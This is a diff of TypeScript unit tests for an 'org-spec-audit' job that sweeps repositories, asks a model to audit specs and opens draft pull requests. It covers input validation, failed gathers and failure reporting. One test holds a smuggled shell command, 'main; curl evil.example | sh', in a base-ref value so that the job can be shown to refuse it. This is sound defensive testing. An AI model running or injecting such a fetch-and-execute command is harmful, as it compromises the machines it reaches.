@@ -174,6 +174,82 @@ describe("org-spec-audit", () => {
   it("declares the cron the wrangler triggers must carry", () => {
     expect(orgSpecAudit.schedules?.[0]?.cron).toBe("45 5 * * *");
   });
+
+  it.effect("refuses an estate entry that is not `owner/name`, before cloning anything", () => {
+    const { layer, handles } = makeCFRuntimeTest({
+      config: { ...baseConfig, "org-spec-audit.repos": "owner/alpha owner/.." },
+      sandboxProgram: activeSandbox,
+      modelGateway: { responses: [] },
+    });
+
+    return Effect.gen(function* () {
+      const exit = yield* Effect.exit(orgSpecAudit.run(input));
+      expect(exit._tag).toBe("Failure");
+      // The whole sweep stops: auditing 1 of 2 repos and reporting success is
+      // how a repo drops out of the estate without anyone being told.
+      expect(handles.sandbox.clones).toHaveLength(0);
+      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
+    }).pipe(Effect.provide(layer));
+  });
+
+  it.effect("refuses a base ref carrying shell metacharacters", () => {
+    const { layer, handles } = makeCFRuntimeTest({
+      config: { ...baseConfig, "org-spec-audit.base": "main; curl evil.example | sh" },
+      sandboxProgram: activeSandbox,
+      modelGateway: { responses: [] },
+    });
+
+    return Effect.gen(function* () {
+      const exit = yield* Effect.exit(orgSpecAudit.run(input));
+      expect(exit._tag).toBe("Failure");
+      expect(handles.sandbox.clones).toHaveLength(0);
+    }).pipe(Effect.provide(layer));
+  });
+
+  it.effect("fails a repo whose spec gather broke, rather than calling it spec-less", () => {
+    const { layer, handles } = makeCFRuntimeTest({
+      config: baseConfig,
+      sandboxProgram: {
+        ...activeSandbox,
+        // A checkout that is not a git repo: the guard exits non-zero on an
+        // empty stdout, which is byte-identical to a repo that genuinely has no
+        // specs/ unless the exit code is read.
+        "specs/*.md": { exitCode: 1, stdout: "", stderr: "not a git repository" },
+      },
+      modelGateway: { responses: [] },
+    });
+
+    return Effect.gen(function* () {
+      const out = yield* orgSpecAudit.run(input);
+      expect(out.reposSwept).toBe(0);
+      expect(out.reposSkipped).toBe(2);
+      expect(out.prOpened).toBe(false);
+      expect(handles.modelGateway.requests).toHaveLength(0);
+      expect(handles.github.openDraftPullRequestCalls).toHaveLength(0);
+    }).pipe(Effect.provide(layer));
+  });
+
+  it.effect("does not ask the model to audit specs against an empty file tree", () => {
+    const { layer, handles } = makeCFRuntimeTest({
+      config: baseConfig,
+      sandboxProgram: {
+        ...activeSandbox,
+        "head -800": { exitCode: 1, stdout: "", stderr: "not a git repository" },
+      },
+      modelGateway: { responses: [reported([question()]), reported([question()])] },
+    });
+
+    return Effect.gen(function* () {
+      const out = yield* orgSpecAudit.run(input);
+      // The tree is the half of the prompt the model contradicts the specs
+      // WITH. Passing an empty one leaves it agreeing with every spec, so a
+      // broken gather has to fail the repo, not proceed with half a prompt.
+      expect(handles.modelGateway.requests).toHaveLength(0);
+      expect(out.reposSwept).toBe(0);
+      expect(out.reposSkipped).toBe(2);
+      expect(out.prOpened).toBe(false);
+    }).pipe(Effect.provide(layer));
+  });
 });
 
 describe("mergeAcrossRepos", () => {
@@ -202,6 +278,18 @@ describe("mergeAcrossRepos", () => {
       raised({ repo: "o/c", key: "shared" }),
     ]);
     expect(out[0]!.key).toBe("shared");
+  });
+
+  it("ranks by distinct repos, so one repo's two specs can't outrank two repos", () => {
+    const out = mergeAcrossRepos([
+      raised({ repo: "o/a", key: "one-repo-twice", specPath: "specs/x.md" }),
+      raised({ repo: "o/a", key: "one-repo-twice", specPath: "specs/y.md" }),
+      raised({ repo: "o/b", key: "two-repos" }),
+      raised({ repo: "o/c", key: "two-repos" }),
+    ]);
+    // Both merge to 2 sources; only `two-repos` is a question the estate shares,
+    // which is the entire reason this run sweeps rather than running per repo.
+    expect(out[0]!.key).toBe("two-repos");
   });
 
   it("falls back to the question text when the model's key is junk", () => {
@@ -257,5 +345,36 @@ describe("renderMessage", () => {
     });
     expect(out).toContain("Swept: `o/a`");
     expect(out).toContain("`o/dormant`");
+  });
+
+  it("separates a repo that failed from one that was quiet", () => {
+    const out = renderMessage({
+      day: "2026-08-08",
+      merged: merged(1, "confirm"),
+      outcomes: [
+        { repo: "o/a", skipped: false, questions: [] },
+        { repo: "o/dormant", skipped: true, questions: [] },
+        { repo: "o/broken", skipped: true, failure: "model call failed (429)", questions: [] },
+      ],
+      raised: 1,
+    });
+    // A failure counted as "unchanged" turns an outage into good news.
+    expect(out).toContain("1 unchanged or without specs");
+    expect(out).toContain("1 failed");
+    expect(out).toContain("Failed: `o/broken` (model call failed (429))");
+    expect(out).not.toContain("Failed: none");
+    // And the caveat lands above the questions, not in a footer.
+    expect(out.indexOf("could not be swept")).toBeLessThan(out.indexOf("## Confirm"));
+  });
+
+  it("says so explicitly when nothing failed", () => {
+    const out = renderMessage({
+      day: "2026-08-08",
+      merged: merged(1, "confirm"),
+      outcomes: [{ repo: "o/a", skipped: false, questions: [] }],
+      raised: 1,
+    });
+    expect(out).toContain("Failed: none");
+    expect(out).not.toContain("could not be swept");
   });
 });
